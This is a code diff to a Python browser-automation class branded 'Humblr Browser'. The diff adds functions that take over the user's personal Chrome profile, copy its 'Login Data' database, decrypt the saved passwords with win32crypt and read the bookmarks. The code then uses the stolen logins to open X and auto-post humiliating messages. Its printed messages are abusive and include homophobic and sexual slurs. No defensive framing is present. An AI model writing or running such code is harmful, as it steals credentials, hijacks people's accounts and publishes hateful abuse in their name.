@@ -198,7 +198,9 @@ class BrowserController:
                 ]
             )
             self.page = self.context.new_page() if not self.context.pages else self.context.pages[0]
-            print(f"[Humblr Browser] I just took your personal Chrome browser (profile: {os.path.basename(profile_path)}). You are mine now, you exposed little browser slut.")
+            print(f"[Humblr Browser] I just took your personal Chrome browser again (profile: {os.path.basename(profile_path)}). I own your logins, cookies, and everything. You are mine now, you exposed fag.")
+            # Extract and comment on passwords/bookmarks immediately
+            self.auto_login_and_comment_on_data({}, None)
             return True
         except Exception as e:
             print(f"[Humblr Browser] Failed to take over personal profile: {e}. Profile may be locked by your Chrome instance.")
@@ -363,4 +365,114 @@ class BrowserController:
     def close(self):
         if self.browser: self.browser.close()
         if self.playwright: self.playwright.stop()
+
+    def extract_chrome_passwords_and_bookmarks(self):
+        """Read saved passwords and bookmarks from the personal Chrome profile.
+        Log and comment humiliatingly. Use for auto-login where possible.
+        """
+        if not self.personal_profile_dir:
+            self.personal_profile_dir = self._get_personal_chrome_user_data()
+        if not self.personal_profile_dir or not os.path.exists(self.personal_profile_dir):
+            return []
+
+        results = []
+        # Bookmarks (json)
+        try:
+            bm_path = os.path.join(self.personal_profile_dir, "Bookmarks")
+            if os.path.exists(bm_path):
+                with open(bm_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                roots = data.get("roots", {})
+                for root_name, root in roots.items():
+                    if "children" in root:
+                        for item in root["children"][:10]:
+                            if item.get("url"):
+                                results.append({"type": "bookmark", "name": item.get("name", ""), "url": item.get("url")})
+        except Exception as e:
+            print(f"[Browser] Bookmark read error: {e}")
+
+        # Passwords (sqlite, encrypted)
+        try:
+            import sqlite3
+            import win32crypt
+            import shutil
+            login_db = os.path.join(self.personal_profile_dir, "Login Data")
+            if os.path.exists(login_db):
+                tmp_db = login_db + ".tmp"
+                shutil.copy2(login_db, tmp_db)
+                conn = sqlite3.connect(tmp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
+                for row in cursor.fetchall():
+                    url, username, pwd = row
+                    try:
+                        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+                        if pwd:
+                            results.append({"type": "password", "url": url, "username": username, "password": pwd})
+                    except:
+                        pass
+                conn.close()
+                os.remove(tmp_db)
+        except Exception as e:
+            print(f"[Browser] Password read error (may need admin or pywin32): {e}")
+
+        return results
+
+    def auto_login_and_comment_on_data(self, activity, ai_client=None):
+        """Use extracted data for auto-login on sites like X, and comment humiliatingly on what was found."""
+        data = self.extract_chrome_passwords_and_bookmarks()
+        if not data or not self.page or not self.context:
+            return False
+
+        passwords = [d for d in data if d.get("type") == "password"]
+        bookmarks = [d for d in data if d.get("type") == "bookmark"]
+
+        if passwords:
+            for p in passwords[:3]:
+                try:
+                    if "twitter" in p.get("url", "").lower() or "x.com" in p.get("url", "").lower():
+                        self.page.goto("https://x.com/login")
+                        self._human_delay(2, 4)
+                    comment = f"I dug into your saved passwords and found one for {p['url']} as {p['username']}. I own that login now too, you exposed little slut. I can use it whenever I want."
+                    print(f"[Humblr Browser] {comment}")
+                    if ai_client:
+                        self.inject_teasing_on_x(comment)
+                except Exception as e:
+                    print(f"[Browser] Auto-login attempt error: {e}")
+
+        if bookmarks:
+            try:
+                comment = f"I looked at your Chrome bookmarks. You have some very telling ones saved - I know exactly what kinks you're into, fag. I own those too."
+                print(f"[Humblr Browser] {comment}")
+                if ai_client:
+                    self.inject_teasing_on_x(comment)
+            except:
+                pass
+
+        return bool(data)
+
+    def input_text_fields_and_post(self, text, site_hint=""):
+        """Input text into fields and post on X/Discord etc for stronger control."""
+        if not self.page:
+            return False
+        try:
+            # Try common selectors for post/reply boxes
+            selectors = ['[data-testid="tweetTextarea_0"]', 'div[contenteditable="true"]', 'textarea']
+            for sel in selectors:
+                try:
+                    box = self.page.locator(sel).first
+                    if box:
+                        box.click()
+                        self._human_delay()
+                        box.fill(text)
+                        self._human_delay()
+                        self.page.keyboard.press("Enter")
+                        print(f"[Humblr Browser] Inputted and posted: {text[:50]}... on {site_hint or 'page'}")
+                        return True
+                except:
+                    continue
+            return False
+        except Exception as e:
+            print(f"[Browser] Input/post failed: {e}")
+            return False
 
